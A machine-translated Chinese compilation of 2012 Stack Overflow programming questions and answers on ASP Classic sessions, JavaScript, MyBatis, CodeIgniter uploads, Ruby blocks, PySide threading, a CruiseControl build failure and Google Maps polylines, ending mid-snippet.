> 赞同：1
> 
> 时间：2012-06-12T07:08:53.583
> 
> 标签：session, asp-classic, vbscript

我有一个**“login.asp”**页面，我在其中设置会话变量。

```
Session("username") = username 
```

并访问如下值：

```
Dim username 
username = Session("username")
response.write(username ) 
```

我也在同一页面中使用“response.write”（即在vbscript中）使用这个值。之后，我将用户重定向到**"user.asp"**。在此页面中，当我尝试访问会话值时，它返回 null。如何在重定向页面中获取会话值？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T09:17:13.143

下面的代码有效：

设置用户名会话变量

登录.asp

```
<%
Dim username  
username = "auser"

Session("username") = username 
response.redirect("user.asp") 
%> 
```

获取用户名会话变量

用户.asp

```
<%
Dim username  
username = Session("username") 

response.write("username=" + username ) 
%> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T09:08:59.500

你不是在设置它，而是在你的例子中得到它。尝试登录

```
Session("username") = username 
```

和

```
username = Session("username") 
```

在你的 user.asp

我自己有一个例程，但你必须使用 NTLM 让它工作我将它导入到我需要它的所有页面中

```
<!--#include file="routines.asp"--> 
```

在routines.asp中我有

```
Function getUser()
  getUser = uCase(Request.ServerVariables("AUTH_USER"))
End Function 
```

# javascript - Javascript中是否有字符串增量运算符？

> ID：10991948
> 
> 赞同：-5
> 
> 时间：2012-06-12T07:09:32.750
> 
> 标签：javascript

我知道数学和整数有很多，但是`x+=y`可以代替吗`x+='<div></div>'`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-20T05:12:10.497

令我震惊的是，这个问题比看起来要棘手得多。`x=+y`在阅读 Zee Tee的评论时，我的直接想法`x+=y`是他（她？）需要更好的调试工具。但猜猜怎么了。我玩了这个小测试：

```
/*global console*/
var obj = {"name":"Zee Tee", "id": 1, "location":"Earth"},
prop, s="";
for(prop in obj){
    s += prop + ":" + obj[prop] + " ";
}
console.log(s); 
```

将 += 更改为 =+ 。我在 Aptana 和 NetBeans 7 中进行了尝试，它们通常都能为我提供很好的调试信息，我通过 JSLint 运行它。这两个 IDE 没有发出任何错误信号，JSLint 提供了关于我的 for 循环的建议，但它没有发现操作员有任何问题。大概 =+ 是有效的 JavaScript - 我只是不知道它应该做什么。这看起来像是 JavaScript 中非常难以追踪的错误之一。Zee Tee，我绝对推荐使用具有良好错误反馈的 IDE 并使用 JSLint，但在这种情况下，您自己找到了错误。我希望你的问题没有得到这么多的反对票，但也许如果你将代码包含在那个错误中，有人可能会追踪到它。你真的应该用你发现的错误自己回答。

# c++ - vtkMy python 包装

> ID：10991949
> 
> 赞同：2
> 
> 时间：2012-06-12T07:09:33.083
> 
> 标签：c++, python, cmake, word-wrap, vtk

[VTK](http://www.vtk.org/)提供了使用 C++ 类扩展库的可能性，以便它们可以在 Python（或任何支持的语言）中使用。据我所知，有两种方法可以做到这一点，使用库提供的示例文件夹 vtkLocal 或 vtkMy (Examples/Build/)。

我想使用此功能，但我不了解安装过程（Debian 上的 vtk 5.8）。我遵循 vtkMy 上的 README 指令，它编译并生成 3 个文件：vtk*.so vtk*Python.so 和 vtk*PythonD.so。我接下来应该做什么？我已经尝试将这些文件的路径附加到`$PATH`，`$PYTHONPATH`或者`$LD_LIBRARY_PATH`按照建议，但我从来没有能够将`import`任何东西放入 Python 中。

任何关于如何编译/导入/使用 vtkMy 中提供的虚拟类的见解甚至一些说明都将是一个巨大的帮助。

# mybatis - mybatis返回结果图有重复条目

> ID：10991950
> 
> 赞同：3
> 
> 时间：2012-06-12T07:09:42.453
> 
> 标签：mybatis

我正在使用 mybatis 从 DB 中检索数据，返回的数据包含重复条目。

所需结果：列名、值

预期结果是：column1 value A 但返回结果是：column1 value A，column1 value A。

希望能够澄清我的疑问。

谁能告诉我为什么会这样？

```
<select id="getContentMap" resultType="map" parameterType="map">
            select planId,location_qualifier  from disclaimer_disclosure_content where 
            <choose>
                <when test="plan_id != null">
                    plan_id = #{plan_id}
                </when>
                <when test="product_id != null">
                    product_id = #{product_id}
                </when>
                <otherwise>
                    issuer_id = #{issuer_id}
                </otherwise>
            </choose>
             and effective_date >= #{effective_date} 
             and location_qualifier LIKE  CONCAT('%' , #{location_qualifier} , '%') 
        </select> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-13T17:02:59.820

您看到的问题是 MyBatis 3 中的一个错误，直到版本 3.0.6： [http](http://code.google.com/p/mybatis/issues/detail?id=303) ://code.google.com/p/mybatis/issues/detail?id=303 。

发布后，您会得到我在另一个答案中概述的答案（使用 MyBatis 3.1.1 完成）。

您有四个选择：

1.  忽略它，只抓取大写或小写条目
2.  升级到至少 3.0.6
3.  停止使用 map 作为 resultType 并移动到 POJO 域对象
4.  使用以下解决方法：

### MyBatis < 3.0.6 的解决方法

使用完整的大写列别名，它们只会在您的地图中显示一次（以大写形式）：

```
<select id="getContentMap" resultType="map" parameterType="map">
  select plan_id as PLAN_ID, location_qualifier as LOCATION_QUALIFIER from disclaimer_disclosure_content
  where
  <!-- SNIP: is the same as you had -->
</select> 
```

这导致输出：

```
{PLAN_ID=2, LOCATION_QUALIFIER=Bar} 
```

（或类似的东西，具体取决于您选择的外观）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T23:03:03.303

您可能需要报告更多信息，例如：

1.  你用的是什么数据库？
2.  您使用的是哪个版本的 MyBatis 3（或者您仍在使用 iBATIS）？
3.  你的表结构是什么样的？

无论如何，我使用 MySQL 5.1 和 MyBatis-3.1.1 尝试了一个稍微简化的查询版本，它工作得很好——这意味着我只在结果映射中取回了一个列名条目。我在下面提供了我的设置，因此您可以尝试重现它或诊断您的代码可能出错的地方。

首先，您的选择语句中有错误。你有

```
SELECT planId 
```

但是你有：

```
WHERE ... plan_id = #{plan_id} 
```

所以你可能是指`SELECT plan_id`在 SELECT 子句中。

这对我有用。

我稍微简化的 MyBatis 选择映射是：

```
<select id="getContentMap" resultType="map" parameterType="map">
  SELECT plan_id, location_qualifier FROM disclaimer_disclosure_content
  WHERE
  <choose>
    <when test="plan_id != null">
      plan_id = #{plan_id}
    </when>
    <otherwise>
     product_id = #{product_id}
    </otherwise>
  </choose>
  AND location_qualifier LIKE CONCAT('%' , #{location_qualifier} , '%')
</select> 
```

其次，我的这个查询的 MySQL 表：

```
mysql> select * from disclaimer_disclosure_content;
+---------+--------------------+------------+
| plan_id | location_qualifier | product_id |
+---------+--------------------+------------+
|       1 | Foo                |        101 |
|       2 | Bar                |        102 |
|       3 | Baz                |        103 |
|       4 | Quux               |        104 |
+---------+--------------------+------------+
4 rows in set (0.01 sec) 
```

三、我的Java代码使用映射：

```
@Test
public void testForSO() throws Exception {
  Map<String, Object> paramMap = new HashMap<String, Object>();
  paramMap.put("plan_id", 2);
  paramMap.put("location_qualifier", "Ba");

  List<Map<String,Object>> lmap = session.selectList("getContentMap", paramMap);
  assertNotNull(lmap);
  Map<String,Object> m = lmap.get(0);
  assertNotNull(m);
  System.out.println(m.toString());
} 
```

这通过并打印出来：

```
{location_qualifier=Bar, plan_id=2} 
```

我也试过了

```
Map<String,Object> m = session.selectOne("getContentMap", paramMap); 
```

并得到相同的预期结果。

# codeigniter - 区分 CodeIgniter 中的视频和图像上传

> ID：10991952
> 
> 赞同：0
> 
> 时间：2012-06-12T07:09:59.497
> 
> 标签：codeigniter, codeigniter-2

我可以从我的文件上传图像或视频。我已将图像的配置文件设置如下：

```
 $config['upload_path'] = './docs/';
        $config['allowed_types'] = 'gif|jpg|png';
        $config['max_size'] = '200';
        $config['max_width']  = '250';
        $config['max_height']  = '250';
        $config['file_name']  = md5(rand().time());

        $this -> load -> library('upload', $config); 
```

但是当我上传视频时，此配置将不起作用，因为我需要能够上传更大尺寸的文件（视频）。提交后有什么办法可以找出我上传的内容（ img/video ）并基于此我可以启用配置文件。

视频配置如下：

```
 $configVideo['upload_path'] = './docs/';
            $configVideo['max_size'] = '50240';
            $configVideo['allowed_types'] = 'avi|flv|wmv|mp3|wma';
            $configVideo['overwrite'] = FALSE;
            $configVideo['remove_spaces'] = TRUE;
            $video_name = $date.$_FILES['video']['name'];
            $configVideo['file_name'] = $video_name;

            $this->load->library('upload', $configVideo);
            $this->upload->initialize($configVideo); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:24:30.477

您可以先使用**$_FILES**找出类型。 *未经测试*

```
$type = $_FILES['userfile']['type'];
switch ($type) {
   case 'gif':
   case 'jpg':
   case 'png':
      // do img config setup
      break;
   case 'avi':
   case 'flv':
   case 'wmv':
   case 'mp3':
   case 'wma':
      // do video config
      break;
} 
```

或者，如果您对表单中的文件使用不同的名称，那么为什么不尝试呢？

[**更新**]

```
$config['upload_path'] = './docs/';
if (is_array($_FILES) && isset($_FILES['image']['name'])) {
    // is an image
    $config['upload_path'] = './docs/';
    $config['allowed_types'] = 'gif|jpg|png';
    $config['max_size'] = '200';
    $config['max_width']  = '250';
    $config['max_height']  = '250';
    $config['file_name']  = md5(rand().time());
} elseif (is_array($_FILES) && isset($_FILES['video']['name'])) {
    // is a video
    $config['max_size'] = '50240';
    $config['allowed_types'] = 'avi|flv|wmv|mp3|wma';
    $config['overwrite'] = FALSE;
    $config['remove_spaces'] = TRUE;
    $video_name = $date.$_FILES['video']['name'];
    $config['file_name'] = $video_name;
}

$this->load->library('upload', $config);
$this->upload->initialize($config); 
```

# iphone - 如何在 iPhone 上挂钩来自 IM 的传入消息？

> ID：10991959
> 
> 赞同：1
> 
> 时间：2012-06-12T07:10:17.967
> 
> 标签：iphone, frameworks, hook, jailbreak

关于 mobilesubstrate，我能够通过 ChatKit 框架 /CKSMSService 成功挂接传入的 SMS，但是当消息作为 iMessage 传递时，这不起作用。谁能帮我找到处理传入 iMessage 的正确框架和类？我已经挂钩了一些 IMCore 类，但我无法找到处理刚进来的消息的方法......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-14T03:32:44.453

我会 [先看这里](http://theiphonewiki.com/wiki/index.php?title=IMessage)

并查看[CKMadridService.h 头文件](http://developer.limneos.net/index.php?framework=ChatKit.framework&header=CKMadridService.h)。

# javascript - 如何覆盖 Javascript 中的方法并将其应用于原始对象，而不是子对象？

> ID：10991960
> 
> 赞同：3
> 
> 时间：2012-06-12T07:10:27.330
> 
> 标签：javascript, html, html5-audio, prototypal-inheritance

我正在尝试覆盖`play()`Audio 对象的方法，但我不想只为子对象这样做。我想将它应用到标准音频对象。

问题是我也想用原来的`play()`方法。我尝试克隆音频对象，进行更改，同时调用原始音频对象的`play()`方法并重新分配回原始音频对象。它不起作用。

任何人的想法？例如，如何在仍然调用原始 play 方法的同时`alert()`在方法中添加一个？`play()`

请。我需要这样做，因为我有一个调用新音频的工具生成的调用代码。因此，对于我正在做的数百个代码生成，不断地对此进行全部替换将是一件非常痛苦的事情。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T07:25:53.837

```
Audio.prototype.play = ( function( old ) {
   var a=1, b=2, c=3; // your 'private' variables - if needed;
   return function() {
      console.log( a+b+c );// do something   
      return old.apply( this, arguments );// return 'original' results
   }
} )( Audio.prototype.play ); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T07:16:20.540

基本上可以这样完成：

```
var playOriginal = Audio.prototype.play;
Audio.prototype.play = function(){
    playOriginal.apply(this, arguments);
} 
```

但我不确定这是否适用于所有浏览器。在大多数情况下，不建议扩展原生 JS 对象。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:26:21.880

你可以保存原来的 play 方法，然后用一个可以随时调用原来的方法的新方法替换 play 方法。

```
Audio.prototype.playOriginal = Audio.prototype.play;
Audio.prototype.play = function(){
    this.playOriginal.apply(this, arguments);
} 
```

# html - 无法通过 W3C 验证器检查是否 标签包含在 标签

> ID：10991963
> 
> 赞同：1
> 
> 时间：2012-06-12T07:10:36.763
> 
> 标签：html

以下 HTML 无法通过 W3C HTML 5 验证器 (http://validator.w3.org/check) 检查：

```
<!DOCTYPE html><html>
<head>
<title>Test</title> <meta charset="utf-8"/>
</head>
<body>
 <p>
    This is a demo.
    <aside >
        <p>Aside element node.</p>
    </aside>
 </p>
</body>
</html> 
```

但是如果将 p 标签更改为其他标签，例如 div 标签，它将通过 W3C 验证器检查：

```
<div>
    This is a demo.
    <aside >
        <p>Aside element node.</p>
    </aside>
</div>
</body> 
```

为什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:46:23.093

[`Aside`元素](http://www.w3.org/TR/html5/the-aside-element.html#the-aside-element)是：

> 页面的*一部分*，由与内容相关的内容组成...

（重点补充）

它是[流内容](http://www.w3.org/TR/html5/content-models.html#flow-content)。一个[`p`元素](http://www.w3.org/TR/html5/the-p-element.html#the-p-element)代表一个段落，并包含[Phrasing Content](http://www.w3.org/TR/html5/content-models.html#phrasing-content)，其定义为：

> 文档的文本，以及在段落内级别标记该文本的元素。短语内容形成段落。

和注意事项：

> 大多数被归类为短语内容的元素只能包含本身被归类为短语内容的元素，而不是任何流内容。

因此，它被标记为未通过，因为 - 根据规范，它不符合 HTML5。

另外，从旁边的页面：

> 仅将 side 元素用于括号是不合适的，因为它们是文档主要流程的一部分。

给出另一个暗示，这是不恰当的用法。

# ruby - Ruby中的每个块都可以有一行吗？

> ID：10991971
> 
> 赞同：52
> 
> 时间：2012-06-12T07:11:14.847
> 
> 标签：ruby

是否有一种在 Ruby 中编写每个块的单行方法？

```
cats.each do |cat|
   cat.name
end 
```

我正在尝试缩短项目中的代码量。我正在使用 Ruby 1.9.2。

谢谢！

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2012-06-12T07:16:38.813

是的，你可以写：

```
cats.each { |cat| cat.name } 
```

或者[简单地说](https://stackoverflow.com/questions/1961030/ruby-ampersand-colon-shortcut/1961118)：

```
cats.each(&:name) 
```

请注意，它`Enumerable#each`返回您正在迭代的相同对象（此处`cats`），因此您应该仅在您在块内执行某种副作用时使用它。最有可能的是，您想获得猫的名字，在这种情况下使用[Enumerable#map](http://ruby-doc.org/core-2.4.2/Enumerable.html#method-i-map)代替：

```
cat_names = cats.map(&:name) 
```

* * *

## 回答 #2

> 赞同：54
> 
> 时间：2012-06-12T09:24:30.627

只需删除换行符：

```
cats.each do |cat| cat.name end 
```

请注意，对于块，有两种不同的编码风格。一种编码风格表示*始终*使用`do`/`end`表示跨越多行的块，*始终*使用`{`/`}`表示单行块。如果你跟随那所学校，你应该写

```
cats.each {|cat| cat.name } 
```

另一种风格是*始终*将`do`/`end`用于主要针对其副作用执行的块和`{`/`}`用于主要针对其返回值执行的块。由于`each`丢弃了块的返回值，因此传递一个块的副作用才有意义，所以，如果你遵循那个学校，你应该用`do`/来写它`end`。

但正如@tokland 提到的，更惯用的方式是写

```
cats.each(&:name) 
```

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2012-06-12T12:34:48.323

我用于 rails 控制台/irb 的另一个技巧是用 ';' 分隔命令 例如

```
[1,2].each do |e| ; puts e; end 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2017-04-26T18:44:11.777

```
for cat in cats;cat.name;end 
```

那也应该这样做。

# extjs - 有什么方法可以禁用 PagingTollbar 的下一个和最后一个按钮？

> ID：10991984
> 
> 赞同：0
> 
> 时间：2012-06-12T07:12:14.647
> 
> 标签：extjs

我在我的网格中使用分页。网格存储没有数据，但在分页工具栏中

下一个和最后一个按钮是启用。这是什么原因？我无法理解。

任何人请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T10:13:00.880

你可以管理它。查看[类似](https://stackoverflow.com/questions/4226311/extjs-grid-paging-next-button-is-disabled) [问题](https://stackoverflow.com/questions/7647185/extjs-4-how-to-disable-next-last-icons-in-the-paging-toolbar-when-no-rec)的答案。

此外，您可以在 afterRender 函数上使用 DOM 元素的方法来启用/禁用它。

# php - 在我是管理员的群组时间线上发帖

> ID：10991990
> 
> 赞同：0
> 
> 时间：2012-06-12T07:12:55.037
> 
> 标签：php, facebook, facebook-group

我正在寻找一种在我是管理员的小组时间线上发帖的方法。我想从 php 发布，我想发布为“组”而不是我的个人用户帐户。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T09:23:26.323

编辑：您不能在群组中作为“群组”发布。脸书里面是不可能的。这只能在 Facebook 页面上实现。您可以创建一个 facebook 页面并按照说明作为“页面”发布。

这里是[Authenticating as a Page的说明](https://developers.facebook.com/docs/authentication/pages/)

简短的摘要：

> 1.  验证用户并请求 manage_pages 权限
>     
>     
> 2.  获取用户管理的页面列表 (https://graph.facebook.com/me/accounts?access_token=USER_ACCESS_TOKEN)
>     
>     
>     
>     > 响应将是用户管理的一系列页面和应用程序 [...] 在每个块内将是一个页面访问令牌或应用程序访问令牌，可用于向 Graph API 发出请求。

# python - PySide：从另一个线程更新 GUI 的更简单方法

> ID：10991991
> 
> 赞同：15
> 
> 时间：2012-06-12T07:12:58.027
> 
> 标签：python, multithreading, qt, signals-slots, pyside

我有一个生成多个线程的 PySide (Qt) GUI。线程有时需要更新 GUI。我已经通过以下方式解决了这个问题：

```
class Signaller(QtCore.QObject) :
    my_signal = QtCore.Signal(QListWidgetItem, QIcon)
signaller = Signaller()

class MyThread(threading.Thread):
    def __init__(self):
        super(IconThread, self).__init__()
        # ...

    def run(self) :
        # ...

        # Need to update the GUI
        signaller.my_signal.emit(self.item, icon)

#
# MAIN WINDOW        
# 
class Main(QtGui.QMainWindow):

    def __init__(self):
        QtGui.QMainWindow.__init__(self)

        # ...

        # Connect signals
        signaller.my_signal.connect(self.my_handler)

    @QtCore.Slot(QListWidgetItem, QIcon)
    def my_handler(self, item, icon):
        item.setIcon(icon)

    def do_something(self, address):
        # ...

        # Start new thread 
        my_thread = MyThread(newItem)
        my_thread.start()

    # ... 
```

有没有更简单的方法？创建信号、处理程序并连接它们需要几行代码。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-26T02:06:05.993

我最近开始使用 PySide 进行编码，我需要与 PyGObject 的`GLib.idle_add`行为等效。我基于您的答案（[https://stackoverflow.com/a/11005204/1524507](https://stackoverflow.com/a/11005204/1524507)）中的代码，但是这个使用事件而不是我们自己使用队列。

```
from PySide import QtCore

class InvokeEvent(QtCore.QEvent):
    EVENT_TYPE = QtCore.QEvent.Type(QtCore.QEvent.registerEventType())

    def __init__(self, fn, *args, **kwargs):
        QtCore.QEvent.__init__(self, InvokeEvent.EVENT_TYPE)
        self.fn = fn
        self.args = args
        self.kwargs = kwargs

class Invoker(QtCore.QObject):
    def event(self, event):
        event.fn(*event.args, **event.kwargs)

        return True

_invoker = Invoker()

def invoke_in_main_thread(fn, *args, **kwargs):
    QtCore.QCoreApplication.postEvent(_invoker,
        InvokeEvent(fn, *args, **kwargs)) 
```

在上面的答案链接中使用相同的方式。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-12T21:32:57.143

这就是我到目前为止所拥有的。我在帮助模块的某处写了以下代码：

```
from Queue import Queue
class Invoker(QObject):
    def __init__(self):
        super(Invoker, self).__init__()
        self.queue = Queue()

    def invoke(self, func, *args):
        f = lambda: func(*args)
        self.queue.put(f)
        QMetaObject.invokeMethod(self, "handler", QtCore.Qt.QueuedConnection)

    @Slot()
    def handler(self):
        f = self.queue.get()
        f()
invoker = Invoker()

def invoke_in_main_thread(func, *args):
    invoker.invoke(func,*args) 
```

然后我的线程可以很容易地运行代码来更新主线程中的 GUI。无需为每个操作创建和连接信号。

```
class MyThread(threading.Thread):
    def __init__(self):
        super(IconThread, self).__init__()
        # ...

    def run(self) :
        # ...

        # Need to update the GUI
        invoke_in_main_thread(self.item.setIcon, icon) 
```

我认为这样的事情非常好。

# java - 使用 Java 和 GWT Web 应用程序运行 Cruise Control 时出现问题

> ID：10991992
> 
> 赞同：0
> 
> 时间：2012-06-12T07:13:07.117
> 
> 标签：java, gwt, cruisecontrol

我正在使用 Java 和 GWT Web 应用程序进行巡航控制。我使用`./cruisecontrol.sh`. 我正在使用休眠。我已经使用了所有的 Hibernate 罐子，但我得到了以下异常：

```
INFO  ScriptRunner     -      [echo] Project Name: /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/buildtest.xml
INFO  ScriptRunner     -     [javac] Compiling 144 source files to /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/war/WEB-INF/classes
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:6: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Column;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:7: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Entity;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:8: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.FetchType;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:9: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.GeneratedValue;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:10: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import static javax.persistence.GenerationType.IDENTITY;
INFO  ScriptRunner     -     [javac]                                ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:10: static import only from classes and interfaces
INFO  ScriptRunner     -     [javac] import static javax.persistence.GenerationType.IDENTITY;
INFO  ScriptRunner     -     [javac] ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:11: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Id;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:12: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.JoinColumn;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:13: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.ManyToOne;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:14: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Table;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:15: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Temporal;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:16: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.TemporalType;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:21: cannot find symbol
INFO  ScriptRunner     -     [javac] symbol: class Entity
INFO  ScriptRunner     -     [javac] @Entity
INFO  ScriptRunner     -     [javac]  ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/Account.java:22: cannot find symbol
INFO  ScriptRunner     -     [javac] symbol: class Table
INFO  ScriptRunner     -     [javac] @Table(name = "account")
INFO  ScriptRunner     -     [javac]  ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:8: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Column;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:9: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Entity;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:10: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.FetchType;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:11: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.GeneratedValue;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:12: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import static javax.persistence.GenerationType.IDENTITY;
INFO  ScriptRunner     -     [javac]                                ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:12: static import only from classes and interfaces
INFO  ScriptRunner     -     [javac] import static javax.persistence.GenerationType.IDENTITY;
INFO  ScriptRunner     -     [javac] ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:13: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Id;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:14: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.JoinColumn;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:15: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.ManyToOne;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:16: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.OneToMany;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:17: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Table;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:18: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.Temporal;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:19: package javax.persistence does not exist
INFO  ScriptRunner     -     [javac] import javax.persistence.TemporalType;
INFO  ScriptRunner     -     [javac]                         ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:24: cannot find symbol
INFO  ScriptRunner     -     [javac] symbol: class Entity
INFO  ScriptRunner     -     [javac] @Entity
INFO  ScriptRunner     -     [javac]  ^
INFO  ScriptRunner     -     [javac] /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/src/com/Project Name/server/domain/User.java:25: cannot find symbol
WARN  ScriptRunner     - BUILD FAILED
WARN  ScriptRunner     - /root/CruiseControl/cruisecontrol-bin-2.8.4/cc-build.xml:19: The following error occurred while executing this line:
WARN  ScriptRunner     - /root/CruiseControl/cruisecontrol-bin-2.8.4/checkout/Demo/buildtest.xml:179: Compile failed; see the compiler error output for details. 
```

# google-maps-api-3 - 如何模拟谷歌地图服务绘制的路线风格

> ID：10991993
> 
> 赞同：1
> 
> 时间：2012-06-12T07:13:26.763
> 
> 标签：google-maps-api-3, polyline

当我们通过谷歌地图网站搜索路线时，像这样的路线：

[http://goo.gl/maps/2mg8](http://goo.gl/maps/2mg8)

谷歌地图会以漂亮的风格绘制路线，比如透明的浅蓝色。

现在我想模拟那种风格，比如，

```
new google.maps.Polyline({
   path: routePath,
   strokeColor: "#0000ff",
   strokeOpacity: 0.69,
   strokeWeight: 4
}); 
```

但是我发现模仿谷歌自己的风格是相当困难的。谁有类似的经验和帮助？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T13:02:25.033

我在代码中找到了这个：

```
q.ra=function(a,b,c,d,e){
    this.color=b||"#0000ff";
    this.weight=Ug(c,5);
    this.opacity=Ug(d,0.45);
    ... 
```

所以合理的选择似乎是

```
strokeColor: "#0000ff",
